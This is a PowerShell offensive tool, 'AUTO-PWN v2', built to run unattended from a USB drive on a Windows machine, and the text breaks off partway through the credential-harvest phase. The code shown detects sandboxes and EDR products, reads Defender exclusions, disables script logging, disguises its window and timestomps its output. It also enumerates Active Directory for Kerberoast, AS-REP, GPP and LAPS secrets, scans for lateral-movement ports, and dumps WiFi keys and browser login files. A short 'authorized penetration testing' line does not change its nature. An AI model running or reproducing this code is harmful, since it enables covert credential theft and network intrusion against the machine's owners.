<#
============================================================================
  FLLC — AUTO-PWN v2: Drop-and-Forget Attack Chain
  ─────────────────────────────────────────────────────

  10-phase offensive pipeline.  Zero interaction required.
  Insert USB. Walk away.  Retrieve results later.

  EXECUTION ORDER:
  ═══════════════

  ┌─ PHASE 0: ENV FINGERPRINT + DEFENSE ENUM + STEALTH ───────┐
  │  VM/sandbox detection, EDR/AV enumeration, AMSI check,     │
  │  Sysmon detection, AppLocker status, PS logging state,     │
  │  process priority reduction, timestomping                  │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 1: RECONNAISSANCE ─────────────────────────────────┐
  │  System info, network config, running processes,           │
  │  installed software, USB history, firewall rules, env vars │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 1.5: NETWORK LATERAL MOVEMENT RECON ───────────────┐
  │  ARP neighbor scan, SMB share enum (admin shares),         │
  │  AD SPN/Kerberoast targets, AS-REP roastable users,        │
  │  Domain Admin group enum, GPP password extraction,         │
  │  LAPS password dump, ADCS CA discovery, port scanning      │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 2: CREDENTIAL HARVEST ─────────────────────────────┐
  │  6 browsers (Chrome/Edge/Brave/Opera/Vivaldi/Firefox),     │
  │  WiFi passwords, cmdkey vault, SSH keys, RDP history,      │
  │  cloud configs (AWS/Azure/GCP/K8s/Docker/Git/.env/.pgpass) │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 2.5: DPAPI CREDENTIAL DECRYPTION ──────────────────┐
  │  AES-256-GCM master key extraction from Local State,       │
  │  Chromium password decryption (v10 blobs), Firefox NSS,    │
  │  Windows Credential Vault extraction, DPAPI key backup,    │
  │  certificate private key export, SAM/SYSTEM hive dump      │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 3: PRIVILEGE ESCALATION ────────────────────────────┐
  │  17-vector privesc scan, 4x UAC bypass, token abuse,       │
  │  service reconfiguration, DLL hijacking, kernel CVEs,      │
  │  PrintNightmare, HiveNightmare, auto-exploit mode          │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 4: SQL INJECTION SCAN ─────────────────────────────┐
  │  Local service discovery (11 ports), endpoint crawling,    │
  │  40+ SQLi payloads (error/boolean/time/UNION), DB detect   │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 5: NPP EXPLOITATION ───────────────────────────────┐
  │  5 attack vectors, DLL hijacking, updater sideloading,     │
  │  NppFTP credential extraction, CVE matching, persistence   │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 6: PERSISTENCE — INPUT MONITOR ─────────────────────┐
  │  Dual-method capture (pynput + Win32 hooks), keystrokes,   │
  │  mouse clicks, clipboard, window tracking, URL capture     │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 7: DATA PACKAGING ─────────────────────────────────┐
  │  Session manifest, file inventory, ZIP compression         │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 8: NETWORK EXFILTRATION ────────────────────────────┐
  │  HTTP POST chunked upload, DNS tunneling, webhook notify   │
  │  (Discord/Slack/Teams), configurable C2 endpoints          │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 9: ANTI-FORENSICS + CLEANUP ───────────────────────┐
  │  PS history scrub, event log clearing, prefetch cleanup,   │
  │  timestomping all output, recent items purge               │
  └────────────────────────────────────────────────────────────┘

  AUTHORIZED PENETRATION TESTING USE ONLY.
  FLLC
============================================================================
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference    = "SilentlyContinue"

# ══════════════════════════════════════════════════════════════════════════
#  DYNAMIC PATH DETECTION
# ══════════════════════════════════════════════════════════════════════════

# Find the drive we're running from
$scriptRoot = $PSScriptRoot
if (-not $scriptRoot) { $scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not $scriptRoot) { $scriptRoot = (Get-Location).Path }

# Determine output drive (Micro SD = wherever collected/ is or should be)
$collectBase = $null
$payloadBase = $null

# Try parent directories
$testPaths = @(
    (Split-Path $scriptRoot -Parent),
    $scriptRoot,
    "$scriptRoot\.."
)

foreach ($tp in $testPaths) {
    if (Test-Path "$tp\payloads") { $payloadBase = "$tp\payloads"; break }
}
if (-not $payloadBase) { $payloadBase = $scriptRoot }

# Output goes to collected/ on the same drive
$driveRoot = (Split-Path $scriptRoot -Qualifier) + "\"
$collectBase = Join-Path $driveRoot "collected"
if (-not (Test-Path $collectBase)) { New-Item -ItemType Directory -Path $collectBase -Force | Out-Null }

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$sessionDir = Join-Path $collectBase "session_$timestamp"
New-Item -ItemType Directory -Path $sessionDir -Force | Out-Null

$masterLog = Join-Path $sessionDir "autopwn.log"

function MLog($msg) {
    $ts = Get-Date -Format "HH:mm:ss.fff"
    Add-Content -Path $masterLog -Value "[$ts] $msg" -Encoding UTF8
}

MLog "══════════════════════════════════════════════"
MLog "  FLLC AUTO-PWN — Session Started"
MLog "  Host: $env:COMPUTERNAME"
MLog "  User: $env:USERDOMAIN\$env:USERNAME"
MLog "  Script: $($MyInvocation.MyCommand.Path)"
MLog "  Output: $sessionDir"
MLog "══════════════════════════════════════════════"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 0: ENVIRONMENT FINGERPRINT + DEFENSE ENUMERATION + STEALTH
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 0] Environment fingerprint + stealth..."

$maxRuntime = 900  # seconds
$startTime = Get-Date
$envInfo = @{}

# ──── 0a. Sandbox / VM / Analysis Detection ────────────────────────────
$vmIndicators = @()
# Check common VM artifacts
$biosVer = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion
$sysModel = (Get-CimInstance Win32_ComputerSystem).Model
$sysMfg   = (Get-CimInstance Win32_ComputerSystem).Manufacturer
$diskModel = (Get-CimInstance Win32_DiskDrive | Select-Object -First 1).Model

if ($biosVer -match "VBOX|VMWARE|Virtual|Hyper-V|QEMU|Xen|BOCHS|Parallels") { $vmIndicators += "BIOS:$biosVer" }
if ($sysModel -match "Virtual|VMware|VirtualBox|QEMU|Xen|HVM|KVM") { $vmIndicators += "Model:$sysModel" }
if ($sysMfg   -match "VMware|innotek|QEMU|Xen|Microsoft Corporation|Parallels") { $vmIndicators += "Mfg:$sysMfg" }
if ($diskModel -match "VBOX|VMWARE|Virtual|QEMU") { $vmIndicators += "Disk:$diskModel" }

# MAC address OUI check for VM vendors
$macs = Get-NetAdapter | ForEach-Object { $_.MacAddress }
$vmMacPrefixes = @("00-05-69","00-0C-29","00-1C-14","00-50-56","08-00-27","00-03-FF","00-1C-42","52-54-00","00-16-3E")
foreach ($m in $macs) {
    $prefix = ($m -split '-')[0..2] -join '-'
    if ($prefix -in $vmMacPrefixes) { $vmIndicators += "MAC:$m" }
}

# Sandbox process detection (common analysis tools)
$sandboxProcs = @("wireshark","fiddler","procmon","procexp","ollydbg","x64dbg","x32dbg",
                  "ida","ida64","ghidra","dnspy","pestudio","regshot","autoruns",
                  "tcpdump","dumpcap","sysmon","processhacker","volatility",
                  "cff explorer","apimonitor","vboxservice","vmtoolsd","vmwaretray")
$runningProcs = (Get-Process).ProcessName.ToLower()
$detectedAnalysis = $sandboxProcs | Where-Object { $_ -in $runningProcs }
if ($detectedAnalysis) { $vmIndicators += "Analysis:$($detectedAnalysis -join ',')" }

# Check for low resource environment (typical sandbox)
$cpuCount = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
$ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
$diskGB = [math]::Round((Get-CimInstance Win32_DiskDrive | Select-Object -First 1).Size / 1GB, 0)
if ($cpuCount -le 1) { $vmIndicators += "CPU:$cpuCount" }
if ($ramGB -lt 2) { $vmIndicators += "RAM:${ramGB}GB" }
if ($diskGB -lt 60) { $vmIndicators += "Disk:${diskGB}GB" }

# Recent files check (sandbox rarely has user activity)
$recentCount = (Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | Measure-Object).Count
if ($recentCount -lt 5) { $vmIndicators += "LowActivity:$recentCount recent files" }

$envInfo.is_virtual = $vmIndicators.Count -gt 0
$envInfo.vm_indicators = $vmIndicators
MLog "[PHASE 0] VM/Sandbox indicators: $($vmIndicators.Count) — $($vmIndicators -join ' | ')"

# ──── 0b. Defense Enumeration ──────────────────────────────────────────
$defenses = @{}

# AV / EDR products
$avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" AntiVirusProduct 2>$null
$defenses.av_products = @()
foreach ($av in $avProducts) {
    $state = [Convert]::ToString($av.productState, 16).PadLeft(6,'0')
    $enabled = $state.Substring(2,2) -ne "00"
    $updated = $state.Substring(4,2) -eq "00"
    $defenses.av_products += @{
        name = $av.displayName
        enabled = $enabled
        definitions_current = $updated
        state_hex = "0x$state"
        path = $av.pathToSignedProductExe
    }
    MLog "[PHASE 0] AV: $($av.displayName) | Enabled:$enabled | Current:$updated"
}

# Windows Defender specific
$defenderStatus = Get-MpComputerStatus 2>$null
if ($defenderStatus) {
    $defenses.defender = @{
        realtime_enabled      = $defenderStatus.RealTimeProtectionEnabled
        behavior_monitoring   = $defenderStatus.BehaviorMonitorEnabled
        ioav_protection       = $defenderStatus.IoavProtectionEnabled
        antispyware_enabled   = $defenderStatus.AntispywareEnabled
        tamper_protection     = $defenderStatus.IsTamperProtected
        cloud_protection      = $defenderStatus.MAPSReporting -ne 0
        submission_consent    = $defenderStatus.SubmitSamplesConsent
        nis_enabled           = $defenderStatus.NISEnabled
        sig_version           = $defenderStatus.AntivirusSignatureVersion
        sig_age_days          = $defenderStatus.AntivirusSignatureAge
        last_scan             = $defenderStatus.FullScanEndTime
        exclusions            = @()
    }
    # Grab exclusions (gold for evasion)
    $prefs = Get-MpPreference 2>$null
    if ($prefs) {
        $defenses.defender.exclusions = @{
            paths      = $prefs.ExclusionPath
            extensions = $prefs.ExclusionExtension
            processes  = $prefs.ExclusionProcess
            ips        = $prefs.ExclusionIpAddress
        }
        MLog "[PHASE 0] Defender exclusions: Paths=$($prefs.ExclusionPath.Count) Ext=$($prefs.ExclusionExtension.Count) Proc=$($prefs.ExclusionProcess.Count)"
    }
}

# EDR process detection
$edrProcesses = @{
    "CrowdStrike"       = @("CSFalconService","CSFalconContainer","csagent","falconhost")
    "SentinelOne"       = @("SentinelAgent","SentinelServiceHost","SentinelStaticEngine","sentinelone")
    "CarbonBlack"       = @("RepMgr","RepUtils","RepWSC","CbDefense","CbOsR")
    "Cylance"           = @("CylanceSvc","CylanceUI")
    "Cortex_XDR"        = @("traps","cyserver","cytray","CortexXDR")
    "Symantec_SEP"      = @("ccSvcHst","SepMasterService","smc","SmcGui")
    "McAfee"            = @("McAfeeFramework","mfetp","masvc","McShield")
    "ESET"              = @("ekrn","egui","eset")
    "Sophos"            = @("SavService","SAVAdminService","SophosClean","SophosHealth")
    "Kaspersky"         = @("avp","avpui","klnagent")
    "Bitdefender"       = @("bdagent","bdservicehost","ProductAgentService")
    "TrendMicro"        = @("tmntsrv","ntrtscan","TMBMSRV")
    "FireEye"           = @("xagt","xagtnotif")
    "Elastic_EDR"       = @("elastic-agent","elastic-endpoint","filebeat","winlogbeat")
    "Sysmon"            = @("Sysmon","Sysmon64")
    "Wazuh"             = @("ossec-agent","wazuh-agent")
    "Qualys"            = @("QualysAgent")
    "Tanium"            = @("TaniumClient")
}
$defenses.edr_detected = @()
foreach ($edr in $edrProcesses.Keys) {
    foreach ($proc in $edrProcesses[$edr]) {
        if ($proc.ToLower() -in $runningProcs) {
            $defenses.edr_detected += $edr
            MLog "[PHASE 0] EDR DETECTED: $edr ($proc)"
            break
        }
    }
}

# AMSI status check
$defenses.amsi_loaded = $false
try {
    $amsiDll = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -match 'amsi' }
    if ($amsiDll -or (Get-Module -Name 'Microsoft.PowerShell.Security' -ErrorAction SilentlyContinue)) {
        $defenses.amsi_loaded = $true
    }
    # Check if AMSI DLL is loaded in our process
    $amsiLoaded = Get-Process -Id $PID | Select-Object -ExpandProperty Modules -ErrorAction SilentlyContinue | Where-Object { $_.ModuleName -match 'amsi' }
    if ($amsiLoaded) { $defenses.amsi_loaded = $true }
} catch {}
MLog "[PHASE 0] AMSI loaded: $($defenses.amsi_loaded)"

# PowerShell logging configuration
$defenses.ps_logging = @{
    script_block  = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue).EnableScriptBlockLogging -eq 1
    module_logging = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -ErrorAction SilentlyContinue).EnableModuleLogging -eq 1
    transcription = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name EnableTranscripting -ErrorAction SilentlyContinue).EnableTranscripting -eq 1
}
MLog "[PHASE 0] PS Logging — ScriptBlock:$($defenses.ps_logging.script_block) Module:$($defenses.ps_logging.module_logging) Transcription:$($defenses.ps_logging.transcription)"

# AppLocker / WDAC status
$defenses.applocker_active = $false
try {
    $alPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
    if ($alPolicy -and $alPolicy.RuleCollections.Count -gt 0) {
        $defenses.applocker_active = $true
        $defenses.applocker_rules = $alPolicy.RuleCollections.Count
        MLog "[PHASE 0] AppLocker ACTIVE: $($alPolicy.RuleCollections.Count) rule collections"
    }
} catch {}

# Sysmon configuration (if present)
$defenses.sysmon_config = $null
if ("sysmon" -in $runningProcs -or "sysmon64" -in $runningProcs) {
    $sysmonHash = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational" -ErrorAction SilentlyContinue
    $defenses.sysmon_config = @{
        running = $true
        channel_enabled = $sysmonHash.Enabled
    }
    MLog "[PHASE 0] Sysmon ACTIVE"
}

$envInfo.defenses = $defenses

# ──── 0c. Stealth Operations ──────────────────────────────────────────
try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing 2>$null
    Clear-History 2>$null
    $host.UI.RawUI.WindowTitle = "Windows Update Service"

    # Disable PowerShell script block logging for this session (if not protected)
    if (-not $defenses.ps_logging.script_block) {
        try {
            $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force 2>$null
            MLog "[PHASE 0] Script block logging disabled for session"
        } catch {}
    }

    # Lower our process priority to avoid resource monitoring alerts
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = 'BelowNormal'
    MLog "[PHASE 0] Process priority lowered to BelowNormal"

    # Timestomp our output directory to blend in
    $fakeDate = (Get-Date).AddDays(-90)
    try {
        (Get-Item $sessionDir).CreationTime = $fakeDate
        (Get-Item $sessionDir).LastWriteTime = $fakeDate
    } catch {}

} catch {}

# Save environment info to session
$envInfo | ConvertTo-Json -Depth 5 | Out-File "$sessionDir\environment.json" -Encoding UTF8

MLog "[PHASE 0] Complete — $(($defenses.edr_detected).Count) EDR(s) detected, $(($defenses.av_products).Count) AV(s) found"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 1: RECONNAISSANCE
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 1] Reconnaissance starting..."
$reconDir = Join-Path $sessionDir "recon"
New-Item -ItemType Directory -Path $reconDir -Force | Out-Null

# System info
$sysInfo = @{
    hostname     = $env:COMPUTERNAME
    username     = $env:USERNAME
    domain       = $env:USERDOMAIN
    os           = (Get-CimInstance Win32_OperatingSystem).Caption
    build        = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    arch         = $env:PROCESSOR_ARCHITECTURE
    cpu          = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name
    ram_gb       = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
    domain_joined= (Get-CimInstance Win32_ComputerSystem).PartOfDomain
    av_products  = (Get-CimInstance -Namespace "root/SecurityCenter2" AntiVirusProduct 2>$null | ForEach-Object { $_.displayName }) -join ", "
    uptime_hours = [math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours, 1)
    local_time   = Get-Date -Format "yyyy-MM-dd HH:mm:ss K"
    timezone     = (Get-TimeZone).DisplayName
    is_admin     = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
$sysInfo | ConvertTo-Json -Depth 3 | Out-File "$reconDir\system_info.json" -Encoding UTF8

# Network config
ipconfig /all > "$reconDir\ipconfig.txt" 2>$null
netstat -ano > "$reconDir\netstat.txt" 2>$null
arp -a > "$reconDir\arp_table.txt" 2>$null
route print > "$reconDir\routes.txt" 2>$null
nslookup $env:USERDNSDOMAIN > "$reconDir\dns.txt" 2>$null
Get-NetAdapter | Select-Object Name,Status,MacAddress,LinkSpeed | Format-Table -AutoSize | Out-File "$reconDir\adapters.txt" -Encoding UTF8

# Active directory info (if domain-joined)
if ($sysInfo.domain_joined) {
    try {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-File "$reconDir\ad_domain.txt" -Encoding UTF8
        Get-ADUser -Filter * -Properties * 2>$null | Select-Object Name,SamAccountName,EmailAddress,Enabled,LastLogonDate | Export-Csv "$reconDir\ad_users.csv" -NoTypeInformation 2>$null
        Get-ADGroup -Filter * 2>$null | Select-Object Name,GroupScope | Export-Csv "$reconDir\ad_groups.csv" -NoTypeInformation 2>$null
    } catch {}
    
    # Net commands
    net user > "$reconDir\net_users.txt" 2>$null
    net localgroup administrators > "$reconDir\net_admins.txt" 2>$null
    net share > "$reconDir\net_shares.txt" 2>$null
    net session > "$reconDir\net_sessions.txt" 2>$null
}

# Running processes
Get-Process | Select-Object Id,ProcessName,Path,Company,StartTime,@{N='Memory_MB';E={[math]::Round($_.WorkingSet64/1MB,1)}} |
    Export-Csv "$reconDir\processes.csv" -NoTypeInformation

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
                 "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
                 "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
    Select-Object DisplayName,DisplayVersion,Publisher,InstallDate |
    Sort-Object DisplayName |
    Export-Csv "$reconDir\installed_software.csv" -NoTypeInformation

# USB devices (current + historical)
Get-PnpDevice -Class USB 2>$null | Select-Object FriendlyName,Status,InstanceId |
    Export-Csv "$reconDir\usb_devices.csv" -NoTypeInformation

# Firewall rules
Get-NetFirewallRule -Enabled True 2>$null | Select-Object Name,Direction,Action,Protocol |
    Export-Csv "$reconDir\firewall_rules.csv" -NoTypeInformation

# Environment variables (may contain API keys, tokens)
Get-ChildItem Env: | Select-Object Name,Value | Export-Csv "$reconDir\env_vars.csv" -NoTypeInformation

MLog "[PHASE 1] Recon complete — saved to $reconDir"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 1.5: NETWORK LATERAL MOVEMENT RECON
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 1.5] Network lateral movement recon..."
$netDir = Join-Path $sessionDir "network_recon"
New-Item -ItemType Directory -Path $netDir -Force | Out-Null

# ──── ARP neighbors (live hosts) ───────────────────────────────────────
$arpEntries = Get-NetNeighbor -AddressFamily IPv4 2>$null | Where-Object { $_.State -ne 'Unreachable' }
$arpEntries | Export-Csv "$netDir\live_hosts.csv" -NoTypeInformation
MLog "[PHASE 1.5] ARP neighbors: $($arpEntries.Count)"

# ──── SMB share enumeration ────────────────────────────────────────────
$smbTargets = @()
$smbTargets += ($arpEntries | Where-Object { $_.IPAddress -notmatch "^(169\.254|224\.|239\.|255\.)" }).IPAddress
if ($sysInfo.domain_joined) {
    # Domain controllers
    try {
        $dcs = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
        $smbTargets += $dcs | ForEach-Object { $_.IPAddress }
    } catch {}
}
$smbTargets = $smbTargets | Sort-Object -Unique | Select-Object -First 30

$shareResults = @()
foreach ($target in $smbTargets) {
    try {
        $shares = net view "\\$target" /all 2>$null
        if ($shares) {
            $shareResults += @{ host = $target; shares = ($shares -join "`n") }
            MLog "[PHASE 1.5] SMB shares found on $target"
        }
    } catch {}
    # Check for common admin shares
    foreach ($adminShare in @("C$","ADMIN$","IPC$")) {
        $testPath = "\\$target\$adminShare"
        if (Test-Path $testPath 2>$null) {
            $shareResults += @{ host = $target; share = $adminShare; accessible = $true }
            MLog "[PHASE 1.5] ADMIN SHARE ACCESSIBLE: $testPath"
        }
    }
}
$shareResults | ConvertTo-Json -Depth 3 | Out-File "$netDir\smb_shares.json" -Encoding UTF8

# ──── Active Directory: SPN enumeration (Kerberoast targets) ───────────
if ($sysInfo.domain_joined) {
    MLog "[PHASE 1.5] AD SPN enumeration..."
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","distinguishedname","memberof","pwdlastset","lastlogon","admincount"))
        $spnResults = $searcher.FindAll()
        $spnData = @()
        foreach ($result in $spnResults) {
            $props = $result.Properties
            $spnData += @{
                user = ($props["samaccountname"] | ForEach-Object { $_ })
                spns = ($props["serviceprincipalname"] | ForEach-Object { $_ })
                dn   = ($props["distinguishedname"] | ForEach-Object { $_ })
                groups = ($props["memberof"] | ForEach-Object { $_ })
                admin_count = ($props["admincount"] | ForEach-Object { $_ })
                pwd_last_set = ($props["pwdlastset"] | ForEach-Object { [DateTime]::FromFileTime($_) })
            }
            MLog "[PHASE 1.5] KERBEROAST TARGET: $($props['samaccountname']) — $($props['serviceprincipalname'])"
        }
        $spnData | ConvertTo-Json -Depth 4 | Out-File "$netDir\kerberoast_targets.json" -Encoding UTF8
        MLog "[PHASE 1.5] Kerberoastable accounts: $($spnData.Count)"
    } catch {
        MLog "[PHASE 1.5] SPN enumeration failed: $($_.Exception.Message)"
    }

    # ──── AD: AS-REP Roastable users (no preauth) ────────────────────
    try {
        $searcher2 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher2.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        $searcher2.PropertiesToLoad.AddRange(@("samaccountname","distinguishedname","memberof"))
        $asrepResults = $searcher2.FindAll()
        $asrepData = @()
        foreach ($result in $asrepResults) {
            $props = $result.Properties
            $asrepData += @{
                user = ($props["samaccountname"] | ForEach-Object { $_ })
                dn = ($props["distinguishedname"] | ForEach-Object { $_ })
            }
            MLog "[PHASE 1.5] AS-REP ROASTABLE: $($props['samaccountname'])"
        }
        $asrepData | ConvertTo-Json -Depth 3 | Out-File "$netDir\asrep_roastable.json" -Encoding UTF8
    } catch {}

    # ──── AD: Domain Admins / High-Value Groups ──────────────────────
    try {
        $highValueGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators",
                            "Account Operators","Backup Operators","DnsAdmins","Server Operators")
        $groupMembers = @{}
        foreach ($grp in $highValueGroups) {
            try {
                $searcher3 = New-Object System.DirectoryServices.DirectorySearcher
                $searcher3.Filter = "(&(objectCategory=group)(cn=$grp))"
                $searcher3.PropertiesToLoad.Add("member") | Out-Null
                $grpResult = $searcher3.FindOne()
                if ($grpResult) {
                    $members = $grpResult.Properties["member"] | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }
                    $groupMembers[$grp] = $members
                    MLog "[PHASE 1.5] $grp members: $($members.Count)"
                }
            } catch {}
        }
        $groupMembers | ConvertTo-Json -Depth 3 | Out-File "$netDir\high_value_groups.json" -Encoding UTF8
    } catch {}

    # ──── AD: GPP Passwords (cpassword in SYSVOL) ────────────────────
    try {
        $domainDN = ([ADSI]"").distinguishedName
        $domain = $env:USERDNSDOMAIN
        $sysvolPath = "\\$domain\SYSVOL\$domain\Policies"
        if (Test-Path $sysvolPath) {
            $gppFiles = Get-ChildItem -Recurse $sysvolPath -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue
            foreach ($gf in $gppFiles) {
                $content = Get-Content $gf.FullName -Raw
                if ($content -match "cpassword") {
                    Copy-Item $gf.FullName (Join-Path $netDir "GPP_$($gf.Name)") -Force 2>$null
                    MLog "[PHASE 1.5] GPP PASSWORD FOUND: $($gf.FullName)"
                }
            }
        }
    } catch {}

    # ──── AD: LAPS (Local Admin Password Solution) ───────────────────
    try {
        $searcher4 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher4.Filter = "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))"
        $searcher4.PropertiesToLoad.AddRange(@("cn","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime"))
        $lapsResults = $searcher4.FindAll()
        if ($lapsResults.Count -gt 0) {
            $lapsData = @()
            foreach ($lr in $lapsResults) {
                $lapsData += @{
                    computer = ($lr.Properties["cn"] | ForEach-Object { $_ })
                    password = ($lr.Properties["ms-mcs-admpwd"] | ForEach-Object { $_ })
                }
                MLog "[PHASE 1.5] LAPS PASSWORD: $($lr.Properties['cn'])"
            }
            $lapsData | ConvertTo-Json -Depth 3 | Out-File "$netDir\laps_passwords.json" -Encoding UTF8
        }
    } catch {}

    # ──── AD: Certificate Services (ESC1-ESC8 reconnaissance) ────────
    try {
        $searcher5 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher5.SearchRoot = [ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$domainDN"
        $searcher5.Filter = "(objectClass=pKIEnrollmentService)"
        $searcher5.PropertiesToLoad.AddRange(@("cn","dNSHostName","certificateTemplates"))
        $caResults = $searcher5.FindAll()
        if ($caResults.Count -gt 0) {
            $caData = @()
            foreach ($ca in $caResults) {
                $caData += @{
                    name = ($ca.Properties["cn"] | ForEach-Object { $_ })
                    dns  = ($ca.Properties["dnshostname"] | ForEach-Object { $_ })
                    templates = ($ca.Properties["certificatetemplates"] | ForEach-Object { $_ })
                }
                MLog "[PHASE 1.5] ADCS CA found: $($ca.Properties['cn'])"
            }
            $caData | ConvertTo-Json -Depth 3 | Out-File "$netDir\adcs_cas.json" -Encoding UTF8
        }
    } catch {}
}

# ──── Port scan top targets for lateral movement services ──────────────
$lateralPorts = @{139="SMB";445="SMB";3389="RDP";5985="WinRM";5986="WinRM-SSL";22="SSH";1433="MSSQL";3306="MySQL";5432="Postgres";6379="Redis";11211="Memcached";27017="MongoDB"}
$portResults = @()
$scanTargets = $smbTargets | Select-Object -First 15
foreach ($target in $scanTargets) {
    foreach ($port in $lateralPorts.Keys) {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $result = $tcp.BeginConnect($target, $port, $null, $null)
            $wait = $result.AsyncWaitHandle.WaitOne(500, $false)
            if ($wait -and $tcp.Connected) {
                $portResults += @{ host = $target; port = $port; service = $lateralPorts[$port] }
                MLog "[PHASE 1.5] OPEN: ${target}:${port} ($($lateralPorts[$port]))"
            }
            $tcp.Close()
        } catch {}
    }
}
$portResults | ConvertTo-Json -Depth 3 | Out-File "$netDir\open_ports.json" -Encoding UTF8

MLog "[PHASE 1.5] Network recon complete — $($shareResults.Count) shares, $($portResults.Count) open ports"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 2: CREDENTIAL HARVEST
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 2] Credential harvest starting..."
$credDir = Join-Path $sessionDir "credentials"
New-Item -ItemType Directory -Path $credDir -Force | Out-Null

# WiFi passwords
$wifiProfiles = netsh wlan show profiles 2>$null
$profiles = ($wifiProfiles | Select-String "All User Profile\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
$wifiCreds = @()
foreach ($p in $profiles) {
    $detail = netsh wlan show profile name="$p" key=clear 2>$null
    $key = ($detail | Select-String "Key Content\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
    $auth = ($detail | Select-String "Authentication\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
    $wifiCreds += "$p | Auth: $auth | Key: $key"
}
$wifiCreds | Out-File "$credDir\wifi_passwords.txt" -Encoding UTF8

# Stored credentials (cmdkey)
cmdkey /list > "$credDir\cmdkey_stored.txt" 2>$null

# Browser data paths
$browserPaths = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

foreach ($browser in $browserPaths.Keys) {
    $path = $browserPaths[$browser]
    if (Test-Path $path) {
        $browserDir = Join-Path $credDir $browser
        New-Item -ItemType Directory -Path $browserDir -Force | Out-Null
        
        if ($browser -eq "Firefox") {
            Get-ChildItem $path -Directory | ForEach-Object {
                $profDir = $_.FullName
                foreach ($f in @("logins.json","key4.db","cookies.sqlite","places.sqlite","formhistory.sqlite")) {
                    if (Test-Path "$profDir\$f") {
